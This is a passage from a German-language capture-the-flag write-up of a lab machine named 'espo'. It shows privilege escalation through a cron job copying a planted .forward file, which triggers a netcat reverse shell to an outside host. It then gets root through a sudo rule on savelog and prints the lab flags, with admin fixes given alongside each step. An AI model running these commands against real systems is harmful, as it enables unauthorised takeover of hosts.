              **Empfehlung (Admin):** Cronjobs und automatisierte Skripte überprüfen. Sicherstellen, dass sie mit minimalen Rechten laufen und nicht auf unsichere Weise mit gemeinsam beschreibbaren Verzeichnissen interagieren.</p>

             <p class="comment">Wir überprüfen die Netzwerkverbindungen und testen, ob das `copyPics`-Skript periodisch ausgeführt wird.</p>
             <div class="code-block">
                 <div class="terminal">
                      <div class="prompt">www-data@espo:/home/mandie$ <span class="command">ss -altpn</span></div>
                     <pre>
State  Recv-Q Send-Q   Local Address:Port   Peer Address:Port Process
LISTEN 0      128            0.0.0.0:22          0.0.0.0:*
LISTEN 0      511            0.0.0.0:80          0.0.0.0:*     users:(("nginx",pid=540,fd=5))
LISTEN 0      100          <span class="command">127.0.0.1:25</span>          0.0.0.0:*         <span class="password"># SMTP Listener</span>
LISTEN 0      80           <span class="command">127.0.0.1:3306</span>        0.0.0.0:*         <span class="password"># MySQL Listener</span>
LISTEN 0      128               [::]:22             [::]:*
LISTEN 0      511               [::]:80             [::]:*     users:(("nginx",pid=540,fd=6))
LISTEN 0      100              [::1]:25             [::]:*
                     </pre>
                      <div class="prompt">www-data@espo:/home/mandie$ <span class="command">cd /var/shared_medias/</span></div>
                      <div class="prompt">www-data@espo:/var/shared_medias$ <span class="command">ls -la</span></div>
                     <pre>
drwxrwxrwt  2 root root    4096 Jan 24 19:57 . <span class="password">(World Writable!)</span>
[...]
                     </pre>
                      <div class="prompt">www-data@espo:/var/shared_medias$ <span class="command">touch test</span></div>
                      <div class="prompt">www-data@espo:/var/shared_medias$ <span class="command">sleep 1m</span></div>
                      <div class="prompt">www-data@espo:/var/shared_medias$ <span class="command">cd /home/mandie/</span></div>
                      <div class="prompt">www-data@espo:/home/mandie$ <span class="command">ls -l test</span></div>
                     <pre><span class="password">-rw-r--r-- 1 mandie mandie 0 Mar 30 23:56 test</span></pre>
                 </div>
             </div>
             <p class="analysis">**Analyse:**
             *   `ss -altpn` zeigt die erwarteten Listener für SSH, Nginx, lokalen SMTP (Port 25) und lokalen MySQL (Port 3306).
             *   `ls -la /var/shared_medias` zeigt, dass dieses Verzeichnis für alle Benutzer beschreibbar ist (Sticky Bit `t` und `w` für `others`).
             *   Wir erstellen eine leere Datei `test` in `/var/shared_medias`. Nach einer Minute Wartezeit (`sleep 1m`) existiert die Datei `test` im Home-Verzeichnis von `mandie` und gehört ihr.</p>
             <p class="evaluation">**Bewertung:** Der Test bestätigt: Das Verzeichnis `/var/shared_medias` ist für uns beschreibbar, und das `copyPics`-Skript läuft periodisch (ca. jede Minute) als Benutzer `mandie` und kopiert neue (nicht-ausführbare) Dateien aus `/var/shared_medias` in ihr Home-Verzeichnis. Der Exploit-Pfad ist bestätigt.</p>
             <p class="recommendation">**Empfehlung (Pentester):** Den `.forward`-Exploit durchführen: Eine Datei namens `.forward` in `/var/shared_medias` erstellen, die einen Befehl zur Ausführung enthält (z.B. Reverse Shell). Anschließend eine E-Mail an `mandie` senden, um die Verarbeitung der `.forward`-Datei durch den lokalen Mailserver (der auf Port 25 lauscht) auszulösen.
             **Empfehlung (Admin):** Die Berechtigungen von `/var/shared_medias` überprüfen. Die Logik und Ausführungsrechte des `copyPics`-Cronjobs überarbeiten. Die Verarbeitung von `.forward`-Dateien im Mailserver deaktivieren, wenn nicht benötigt.</p>

             <p class="comment">Wir implementieren den `.forward`-Exploit, um eine Shell als `mandie` zu erhalten.</p>
             <div class="code-block">
                 <div class="terminal">
                     <div class="prompt">www-data@espo:/var/shared_medias$ <span class="command">nano .forward</span></div>
                     <pre># Inhalt der Datei .forward:
<span class="password">|/dev/shm/pwn</span>
                     </pre>
                      <div class="prompt">www-data@espo:/var/shared_medias$ <span class="command">cd /dev/shm/</span></div>
                      <div class="prompt">www-data@espo:/dev/shm$ <span class="command">nano pwn</span></div>
                     <pre>
#!/bin/bash
<span class="password">nc -e /bin/bash 192.168.2.199 5555</span>
                     </pre>
                      <div class="prompt">www-data@espo:/dev/shm$ <span class="command">chmod +x pwn</span></div>
                      <div class="prompt"># Warten, bis copyPics die .forward-Datei kopiert hat (ca. 1 Minute) ...</div>
                      <div class="prompt">www-data@espo:/dev/shm$ <span class="command">ls /home/mandie/.forward</span></div>
                     <pre>/home/mandie/.forward</pre> <span class="password">(Bestätigt, dass die Datei kopiert wurde)</span>
                      <div class="prompt"># Listener auf Port 5555 starten (anderes Terminal) ...</div>
                       <div class="prompt">┌──(root㉿cyber)-[~]
└─# <span class="command">nc -lvnp 5555</span></div>
                      <pre>listening on [any] 5555 ...</pre>
                      <div class="prompt">www-data@espo:/dev/shm$ <span class="command">echo pwned | mail -s lol mandie</span></div>
                      <pre># (Mail wird gesendet, MTA verarbeitet .forward) </pre>
                      <div class="prompt"># Im Netcat Listener:</div>
                       <div class="prompt">┌──(root㉿cyber)-[~]
└─# <span class="command">nc -lvnp 5555</span></div>
                      <pre>
listening on [any] 5555 ...
<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.111] 58668</span>
id
<span class="command">uid=1000(mandie) gid=1000(mandie) groups=1000(mandie)</span>

cd ~
ls
copyPics
pictures
test
<span class="command">user.txt</span>
videos
cat user.txt
<span class="password">b462a4ac056477047a56ea23e6bbce19</span>
                       </pre>
                  </div>
              </div>
              <p class="analysis">**Analyse:**
              1.  Wir erstellen die Datei `.forward` in `/var/shared_medias` mit dem Inhalt `|/dev/shm/pwn`. Das `|` weist den MTA an, die Mail an ein Programm weiterzuleiten.
              2.  Wir erstellen das Skript `/dev/shm/pwn`, das eine Netcat-Reverse-Shell zu unserer IP (`192.168.2.199`) auf Port `5555` startet.
              3.  Wir machen `/dev/shm/pwn` ausführbar.
              4.  Wir warten, bis der `copyPics`-Cronjob die `.forward`-Datei nach `/home/mandie` kopiert hat.
              5.  Wir starten unseren Netcat-Listener auf Port 5555.
              6.  Wir senden eine E-Mail an den lokalen Benutzer `mandie` (der Inhalt und Betreff sind irrelevant). Der lokale MTA (lauscht auf 127.0.0.1:25) empfängt die Mail, findet die `.forward`-Datei im Home-Verzeichnis von `mandie` und führt gemäß der Pipe `|` das Skript `/dev/shm/pwn` als Benutzer `mandie` aus.
              7.  Unser Listener empfängt die Verbindung, und wir haben eine Shell als `mandie`.
              8.  Wir lesen erfolgreich die `user.txt`.</p>
              <p class="evaluation">**Bewertung:** Privilege Escalation von `www-data` zu `mandie` erfolgreich durchgeführt durch Ausnutzung des Cronjobs und der `.forward`-Mechanik. User-Flag erlangt.</p>
              <p class="recommendation">**Empfehlung (Pentester):** Shell stabilisieren. `sudo -l` für `mandie` prüfen.
              **Empfehlung (Admin):** Cronjob sichern. `.forward`-Verarbeitung prüfen/deaktivieren.</p>
        </section>

        <section id="privesc-root">
             <h2>Privilege Escalation (mandie to root via sudo savelog)</h2>
             <p class="comment">Als Benutzer `mandie` suchen wir nach dem letzten Schritt zur Root-Eskalation.</p>

             <div class="code-block">
                 <div class="terminal">
                     <div class="prompt">mandie@espo:~$ <span class="command">stty rows 48 cols 94</span></div> <span class="password"># Shell-Stabilisierung</span>
                     <div class="prompt">mandie@espo:~$ <span class="command">id</span></div>
                      <pre>uid=1000(mandie) gid=1000(mandie) groups=1000(mandie)</pre>
                     <div class="prompt">mandie@espo:~$ <span class="command">sudo -l</span></div>
                     <pre>
Matching Defaults entries for mandie on espo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mandie may run the following commands on espo:
    <span class="password">(ALL : ALL) NOPASSWD: /usr/bin/savelog</span>
                     </pre>
                 </div>
             </div>
             <p class="analysis">**Analyse:** Nach der Stabilisierung der Shell prüfen wir mit `sudo -l` die Berechtigungen für `mandie`. Es zeigt sich, dass `mandie` den Befehl `/usr/bin/savelog` als `ALL : ALL` (jeder Benutzer, jede Gruppe - effektiv `root`) ohne Passwort (`NOPASSWD`) ausführen darf.</p>
             <p class="evaluation">**Bewertung:** Dies ist ein klarer Vektor zur Root-Rechteerlangung. `savelog` ist auf GTFOBins als Binary gelistet, das für Privilege Escalation missbraucht werden kann, oft durch die Ausführung von Shell-Befehlen.</p>
             <p class="recommendation">**Empfehlung (Pentester):** Die auf GTFOBins beschriebene Methode für `sudo savelog` anwenden, um eine Root-Shell zu erhalten (wahrscheinlich mittels einer Option wie `-c` oder `-x`, die Befehle ausführt).
             **Empfehlung (Admin):** Unsichere `sudo`-Regel für `savelog` entfernen. Nur absolut notwendige Befehle mit minimalen Rechten erlauben.</p>

            <p class="comment">*(Der Bericht zeigt im Folgenden einen ungewöhnlichen Weg über SSH-Keys, obwohl der `savelog`-Exploit direkt möglich wäre. Wir dokumentieren den gezeigten Weg, merken aber an, dass der `savelog`-Exploit der direktere wäre.)*</p>

             <div class="code-block">
                  <div class="terminal">
                     <div class="prompt"># <span class="command">SSH Key Generation & Login (Alternative zu savelog Exploit?)</span></div>
                     <div class="prompt">mandie@espo:~$ <span class="command">ssh-keygen</span></div>
                      <pre>
Generating public/private rsa key pair.
Enter file in which to save the key (/home/mandie/.ssh/id_rsa): <span class="password">[Enter]</span>
Created directory '/home/mandie/.ssh'.
Enter passphrase (empty for no passphrase): <span class="password">[Enter]</span>
Enter same passphrase again: <span class="password">[Enter]</span>
[...]
                      </pre>
                      <div class="prompt">mandie@espo:~$ <span class="command">cp /home/mandie/.ssh/id_rsa.pub /home/mandie/.ssh/authorized_keys</span></div>
                       <div class="prompt">mandie@espo:~$ <span class="command">cat /home/mandie/.ssh/id_rsa</span></div>
                      <pre><span class="password">-----BEGIN OPENSSH PRIVATE KEY-----</span>
[...] <span class="password">(Schlüsselinhalt)</span> [...]
<span class="password">-----END OPENSSH PRIVATE KEY-----</span>
                      </pre>
                      <div class="prompt"># <span class="command">Auf Angreifer-Maschine:</span></div>
                       <div class="prompt">┌──(root㉿cyber)-[~]
└─# <span class="command">vi id_rsa</span></div> <span class="password"># Privaten Schlüssel einfügen</span>
                       <div class="prompt">┌──(root㉿cyber)-[~]
└─# <span class="command">chmod 600 id_rsa</span></div>
                       <div class="prompt">┌──(root㉿cyber)-[~]
└─# <span class="command">ssh mandie@espo.hmv -i id_rsa</span></div>
                      <pre>
[...]
Enter passphrase for key 'id_rsa': <span class="password">[Enter]</span>
Linux espo 6.1.0-13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.55-1 (2023-09-29) x86_64
[...]
Last login: Wed Jan 24 19:46:08 2024 from 192.168.0.30
[oh-my-zsh] Would you like to update? [Y/n] y

╭─<span class="command">mandie@espo</span> ~
╰─$ <span class="password"># Erneuter Login als mandie via SSH Key</span>
                      </pre>
                  </div>
             </div>
              <p class="analysis">**Analyse:** Obwohl `sudo savelog` der direkte Weg wäre, generiert der Pentester hier ein neues SSH-Schlüsselpaar für `mandie`, kopiert den öffentlichen Schlüssel nach `authorized_keys` und kopiert den privaten Schlüssel auf die Angreifer-Maschine. Anschließend wird sich erneut per SSH als `mandie` eingeloggt, diesmal mit dem Schlüssel statt Passwort.</p>
              <p class="evaluation">**Bewertung:** Dieser Schritt ist redundant und unnötig kompliziert, da bereits eine Shell als `mandie` vorhanden war und der `savelog`-Exploit direkt zur Root-Shell führen würde. Es zeigt jedoch, wie man SSH-Key-Authentifizierung einrichten könnte.</p>
              <p class="recommendation">**Empfehlung (Pentester):** Den direkten `savelog`-Exploit aus der bestehenden `mandie`-Shell verwenden.
              **Empfehlung (Admin):** Sicherstellen, dass Benutzer nicht unnötig SSH-Keys generieren und hinzufügen können, wenn nicht vorgesehen.</p>

             <p class="comment">Wir führen nun den `savelog`-Exploit aus, um Root zu werden.</p>
             <div class="code-block">
                 <div class="terminal">
                      <div class="prompt">╭─mandie@espo ~
╰─$ <span class="command">sudo /usr/bin/savelog -x "bash" test</span></div>
                     <pre># (Befehl wird ausgeführt, öffnet eine neue Shell als Root) </pre>
                      <div class="prompt"><span class="command">root@espo:/home/mandie#</span> <span class="password"># Root-Shell erhalten!</span></div>
                      <div class="prompt">root@espo:/home/mandie# <span class="command">cd ~</span></div>
                      <div class="prompt">root@espo:~# <span class="command">ls</span></div>
                     <pre><span class="command">root.txt</span></pre>
                      <div class="prompt">root@espo:~# <span class="command">cat root.txt</span></div>
                     <pre><span class="password">0f4580e1632070ea32ead6334c0527c4</span></pre>
                  </div>
              </div>
              <p class="analysis">**Analyse:** Wir verwenden die `sudo`-Berechtigung, um `savelog` auszuführen. Die Option `-x "bash"` (oder eine ähnliche, von `savelog` unterstützte Option zur Befehlsausführung) wird genutzt, um eine Bash-Shell zu starten. Da `sudo` den Befehl mit Root-Rechten ausführt, erhalten wir eine Root-Shell. Wir wechseln ins Root-Home-Verzeichnis und lesen die `root.txt`.</p>
              <p class="evaluation">**Bewertung:** Privilege Escalation zu `root` erfolgreich durch Ausnutzung der unsicheren `sudo`-Regel für `savelog`.</p>
              <p class="recommendation">**Empfehlung (Pentester):** Root-Flag dokumentieren. Bericht abschließen.
              **Empfehlung (Admin):** Unsichere `sudo`-Regel entfernen.</p>
        </section>

        <section id="flags">
             <div class="flag-container">
                <h2 class="flag-heading">Flags</h2>
                <div class="flag-entry">
                    <div class="flag-command">cat /home/mandie/user.txt</div>
                    <div class="flag-value"><span class="password">b462a4ac056477047a56ea23e6bbce19</span></div>
                </div>
                <div class="flag-entry">
                    <div class="flag-command">cat /root/root.txt</div>
                    <div class="flag-value"><span class="password">0f4580e1632070ea32ead6334c0527c4</span></div>
                </div>
            </div>
        </section>
 

    <footer class="footer">
        <p>DarkSpirit - Cyber Security Reports</p>
        <p>Berichtsdatum: 30. März 2024</p> <!-- Datum aus Nikto/Nmap-Scan extrahiert -->
    </footer>
</body>
</html>